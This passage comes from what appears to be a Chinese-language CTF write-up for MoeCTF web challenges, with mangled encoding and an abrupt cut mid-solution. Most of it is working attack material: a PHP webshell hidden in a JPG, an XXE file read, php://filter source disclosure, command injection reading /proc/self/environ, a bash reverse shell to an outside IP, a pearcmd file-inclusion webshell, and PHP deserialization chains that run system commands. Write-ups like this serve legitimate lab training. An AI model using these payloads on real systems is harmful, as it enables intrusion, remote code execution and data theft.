é«˜é€Ÿä½†ä¿ç•™é—´éš”ï¼Œ100ms å·²ç»éå¸¸å¿«</span></span><br><span class="line">        <span class="built_in">setTimeout</span>(clickNext, <span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">clickNext</span>();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p><img src="D:\typora_pic\image-20250817200041374.png" alt="image-20250817200041374"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;53a0d1ed-ed64-9a27-8e42-8de2ccedd45c&#125;</span><br></pre></td></tr></table></figure>

<h3 id="14-ç¬¬åä¸‰ç« -é€šå¹½å…³Â·çµçº¹è¯¡å½±"><a href="#14-ç¬¬åä¸‰ç« -é€šå¹½å…³Â·çµçº¹è¯¡å½±" class="headerlink" title="14.ç¬¬åä¸‰ç«  é€šå¹½å…³Â·çµçº¹è¯¡å½±"></a>14.<strong>ç¬¬åä¸‰ç«  é€šå¹½å…³Â·çµçº¹è¯¡å½±</strong></h3><ul>
<li>çµçº¹å¿…é¡»åŒ…å«å™¬å¿ƒé­”å°ï¼ˆåå…­è¿›åˆ¶æ ¡éªŒç ï¼šFFD8FFï¼‰</li>
</ul>
<p>åœ¨jpgå°¾éƒ¨åŠ ä¸€å¥è¯æœ¨é©¬å³å¯</p>
<p><img src="D:\typora_pic\image-20250817201323830.png" alt="image-20250817201323830"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;8bc69f8d-67fc-fa57-64cf-58e31cae34c3&#125;</span><br></pre></td></tr></table></figure>

<h3 id="15-10-ç¬¬åç« -å¤©æœºç¬¦é˜µ"><a href="#15-10-ç¬¬åç« -å¤©æœºç¬¦é˜µ" class="headerlink" title="15.10 ç¬¬åç«  å¤©æœºç¬¦é˜µ"></a>15.<strong>10 ç¬¬åç«  å¤©æœºç¬¦é˜µ</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE é˜µæ¢ [</span><br><span class="line">  &lt;!ENTITY hacker SYSTEM &quot;file:///var/www/html/flag.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;é˜µæ¢&gt;</span><br><span class="line">  &lt;è§£æ&gt;&amp;hacker;&lt;/è§£æ&gt;</span><br><span class="line">  &lt;è¾“å‡º&gt;&lt;/è¾“å‡º&gt;</span><br><span class="line">&lt;/é˜µæ¢&gt;</span><br></pre></td></tr></table></figure>

<p><img src="D:\typora_pic\image-20250817202417483.png" alt="image-20250817202417483"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;G00d_7o6_4nD_XX3_Unl0ck_St4r_S34l&#125;</span><br></pre></td></tr></table></figure>

<h3 id="16-ç¬¬åäºŒç« -ç‰é­„ç„å…³Â·ç ´å¦„"><a href="#16-ç¬¬åäºŒç« -ç‰é­„ç„å…³Â·ç ´å¦„" class="headerlink" title="16.ç¬¬åäºŒç«  ç‰é­„ç„å…³Â·ç ´å¦„"></a>16.<strong>ç¬¬åäºŒç«  ç‰é­„ç„å…³Â·ç ´å¦„</strong></h3><p>flagåœ¨ç¯å¢ƒå˜é‡</p>
<p><img src="D:\typora_pic\image-20250817203437631.png" alt="image-20250817203437631"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;715601ed-5928-ec1b-b19c-08e6ebd67f72&#125;</span><br></pre></td></tr></table></figure>

<h3 id="17"><a href="#17" class="headerlink" title="17"></a>17</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HDdssçœ‹åˆ°äº† GET å‚æ•°åç”±m,n,o,p,qè¿™äº”ä¸ªå­—æ¯ç»„æˆï¼ˆæ¯ä¸ªå­—æ¯å‡ºç°ä¸”ä»…å‡ºç°ä¸€æ¬¡ï¼‰ï¼Œé•¿åº¦æ­£å¥½ä¸º 5ï¼Œè™½ç„¶ä¸æ¸…æ¥šå­—æ¯çš„å…·ä½“é¡ºåºï¼Œä½†æ˜¯ä»–çŸ¥é“å‚æ•°åç­‰äºå‚æ•°å€¼æ‰èƒ½è¿›å…¥</span><br></pre></td></tr></table></figure>

<p>å…ˆå‡†å¤‡å¥½å‚æ•°å’Œå€¼</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="comment"># å­—æ¯åˆ—è¡¨</span></span><br><span class="line">letters = [<span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆæ‰€æœ‰å¯èƒ½çš„æ’åˆ—</span></span><br><span class="line">permutations = <span class="built_in">list</span>(itertools.permutations(letters))</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰“å¼€æ–‡ä»¶å¹¶å†™å…¥</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> perm <span class="keyword">in</span> permutations:</span><br><span class="line">        <span class="comment"># å°†æ’åˆ—è½¬æ¢ä¸ºå­—ç¬¦ä¸²</span></span><br><span class="line">        param = <span class="string">&#x27;&#x27;</span>.join(perm)</span><br><span class="line">        <span class="comment"># å†™å…¥ ?xxxxx=xxxxx æ ¼å¼</span></span><br><span class="line">        file.write(<span class="string">f&#x27;?<span class="subst">&#123;param&#125;</span>=<span class="subst">&#123;param&#125;</span>\n&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>æ”¾åœ¨bpé‡Œçˆ†ç ´</p>
<p><img src="D:\typora_pic\image-20250818122234649.png" alt="image-20250818122234649"></p>
<p>ç”¨å¾—åˆ°çš„å‚æ•°å’Œå€¼è®¿é—®,ç”¨ä¼ªåè®®è¯».&#x2F;flag.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=./flag.php</span></span><br></pre></td></tr></table></figure>

<p><img src="D:\typora_pic\image-20250818122316633.png" alt="image-20250818122316633"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PD9waHANCmVjaG8gImZsYWflsLHlnKjov5nkuobvvIznnIvkuI3liLDlkJfvvIzmmK/ogIHlvJ/looPnlYzkuI3lpJ/lkKciOw0KLy9tb2VjdGZ7ZGJkOTFlOTItZDI4Yi0zYTMwLWMyNjItMWNhNDNjOWE1M2MyfQ==</span><br><span class="line"></span><br><span class="line">moectf&#123;dbd91e92-d28b-3a30-c262-1ca43c9a53c2&#125;</span><br></pre></td></tr></table></figure>

<h3 id="18"><a href="#18" class="headerlink" title="18."></a>18.</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1; <span class="built_in">cat</span> /proc/self/environ | grep -i flag</span><br></pre></td></tr></table></figure>

<p><img src="D:\typora_pic\image-20250818144543604.png" alt="image-20250818144543604"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;ee2f1402-c648-2d0b-52ed-f5b30d41e8f6&#125;</span><br></pre></td></tr></table></figure>

<h3 id="19"><a href="#19" class="headerlink" title="19."></a>19.</h3><p>ç»™äº†å‡ ä¸ªé™„ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">include($_GET[&#x27;file&#x27;] . &quot;.php&quot;);</span><br><span class="line"></span><br><span class="line">php.ini</span><br><span class="line">[PHP]</span><br><span class="line">allow_url_fopen = On</span><br><span class="line">allow_url_include = On</span><br><span class="line"></span><br><span class="line">entrypoint.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">echo $FLAG &gt; /flag-$(cat /dev/urandom | tr -dc &#x27;a-zA-Z0-9&#x27; | head -c 30).txt</span><br><span class="line">unset FLAG</span><br><span class="line">apache2-foreground</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆå°è¯•äº†åå¼¹shell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/http://47.122.131.175//2333 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">æ²¡ç”¨</span><br></pre></td></tr></table></figure>

<p>å‘ç°æ˜¯pearcmdæ–‡ä»¶åŒ…å«</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_56019217/article/details/143868969">https://blog.csdn.net/m0_56019217/article/details/143868969</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:52970/?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/%3C?=eval($_POST[1]);?%3E+/var/www/html/shell.php</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸€æ­¥è¦ç”¨bpä¼ ,ç„¶åè®¿é—®shell.phpå³å¯rce</p>
<p><img src="D:\typora_pic\image-20250823221837890.png" alt="image-20250823221837890"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;295f1bc5-65de-55a1-2f82-0c41669e1bf5&#125;</span><br></pre></td></tr></table></figure>



<h3 id="20"><a href="#20" class="headerlink" title="20."></a>20.</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;system(&#x27;ls /&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;system(&#x27;cat /f*&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="D:\typora_pic\image-20250823155706531.png" alt="image-20250823155706531"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;b7e12fcd-b8c3-edcf-db0a-e85c070d7b45&#125;</span><br></pre></td></tr></table></figure>

<h3 id="21"><a href="#21" class="headerlink" title="21"></a>21</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonA</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$name</span>=<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="variable">$name</span>-&gt;<span class="title function_ invoke__">work</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonB</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">work</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$name</span>=<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$name</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;person&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;person&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡personAè°ƒç”¨personBä¸­çš„work()æ–¹æ³•è§¦å‘eval,æƒ³è¦æŠŠä¸€ä¸ªå¯¹è±¡èµ‹å€¼ç»™ä¸€ä¸ªå¯¹è±¡å±æ€§ï¼Œè€Œä¸”è¿˜æ˜¯ç§æœ‰çš„å±æ€§ï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥èµ‹å€¼ï¼Œä¹Ÿä¸èƒ½åœ¨å¤–é¢èµ‹å€¼ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>__construct</code> æ„é€ å‡½æ•°æ¥èµ‹å€¼</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonA</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$xxx</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$xxx</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonB</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;system(&#x27;cat /f*&#x27;);&quot;</span>; <span class="comment">// ä»»æ„PHPä»£ç </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">personB</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">PersonA</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">moectf&#123;<span class="number">84e140</span>ac-<span class="number">1</span>a09-<span class="number">8161</span>-<span class="number">6</span>c26-<span class="number">78</span>c2c6517bfe&#125;</span><br></pre></td></tr></table></figure>

<h3 id="22"><a href="#22" class="headerlink" title="22."></a>22.</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">        <span class="variable">$name</span>-&gt;name = <span class="variable">$id</span>;</span><br><span class="line">        <span class="variable">$name</span>-&gt;age = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonA</span> <span class="keyword">extends</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="variable">$id</span> = <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">        <span class="variable">$age</span> = <span class="variable language_">$this</span>-&gt;age;</span><br><span class="line">        <span class="variable">$name</span>-&gt;<span class="variable">$id</span>(<span class="variable">$age</span>);<span class="comment">//æ¼æ´ç‚¹,æŠŠ$nameèµ‹å€¼ä¸ºå¯¹è±¡,æ–¹æ³•åä¸º $idï¼Œå‚æ•°ä¸º $age</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonB</span> <span class="keyword">extends</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonC</span> <span class="keyword">extends</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__Check</span>(<span class="params"><span class="variable">$age</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">str_contains</span>(<span class="variable">$this</span>-&gt;age . <span class="variable">$this</span>-&gt;name,<span class="string">&quot;flag&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="variable">$name</span>(<span class="variable">$age</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$age</span> = <span class="variable language_">$this</span>-&gt;age;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">        <span class="variable">$name</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="variable">$name</span>(<span class="variable language_">$this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;person&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$person</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;person&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">æ¼æ´åˆ†æå’Œåˆ©ç”¨é“¾è·¯</span><br><span class="line"></span><br><span class="line">PersonA::<span class="title function_ invoke__">__destruct</span>()ï¼š</span><br><span class="line"><span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line"><span class="variable">$id</span> = <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line"><span class="variable">$age</span> = <span class="variable language_">$this</span>-&gt;age;</span><br><span class="line"><span class="variable">$name</span>-&gt;<span class="variable">$id</span>(<span class="variable">$age</span>);  <span class="comment">// è¿™é‡ŒåŠ¨æ€è°ƒç”¨æ–¹æ³•ï¼šå¯¹è±¡ $name çš„æ–¹æ³•åä¸º $idï¼Œå‚æ•°ä¸º $ageã€‚</span></span><br><span class="line">æˆ‘ä»¬å¯ä»¥å°† <span class="variable">$name</span> è®¾ç½®ä¸ºä¸€ä¸ª PersonC å¯¹è±¡ï¼Œ<span class="variable">$id</span> è®¾ç½®ä¸º <span class="string">&quot;__Check&quot;</span>ï¼Œ<span class="variable">$age</span> è®¾ç½®ä¸º <span class="string">&quot;cat flag&quot;</span>ï¼Œä»è€Œè°ƒç”¨ PersonC::<span class="title function_ invoke__">__Check</span>(<span class="string">&quot;cat flag&quot;</span>)ã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PersonC::<span class="title function_ invoke__">__Check</span>(<span class="variable">$age</span>)ï¼š</span><br><span class="line">å…ˆæ£€æŸ¥ <span class="keyword">if</span> (<span class="title function_ invoke__">str_contains</span>(<span class="variable">$this</span>-&gt;age . <span class="variable">$this</span>-&gt;name, <span class="string">&quot;flag&quot;</span>)) <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">æˆ‘ä»¬è®¾ç½® PersonC çš„ <span class="variable">$age</span> = <span class="string">&quot;&quot;</span>ï¼Œ<span class="variable">$name</span> = <span class="string">&quot;system&quot;</span>ï¼Œæ‰€ä»¥ <span class="string">&quot;&quot;</span> . <span class="string">&quot;system&quot;</span> = <span class="string">&quot;system&quot;</span>ï¼Œä¸åŒ…å« <span class="string">&quot;flag&quot;</span>ï¼Œç»•è¿‡æ£€æŸ¥ã€‚</span><br><span class="line"></span><br><span class="line">ç„¶å <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;name;ï¼ˆå³ <span class="string">&quot;system&quot;</span>ï¼‰</span><br><span class="line"><span class="variable">$name</span>(<span class="variable">$age</span>);  <span class="comment">// è¿™é‡Œ $name æ˜¯å­—ç¬¦ä¸² &quot;system&quot;ï¼Œä½†åœ¨ PHP ä¸­ï¼Œå¦‚æœå­—ç¬¦ä¸²æ˜¯å†…ç½®å‡½æ•°åï¼Œå¯ä»¥ç›´æ¥ä½œä¸ºå‡½æ•°è°ƒç”¨ï¼šsystem(&quot;cat flag&quot;)ï¼Œå®ç°å‘½ä»¤æ‰§è¡Œã€‚</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PersonC::<span class="title function_ invoke__">__wakeup</span>()ï¼š</span><br><span 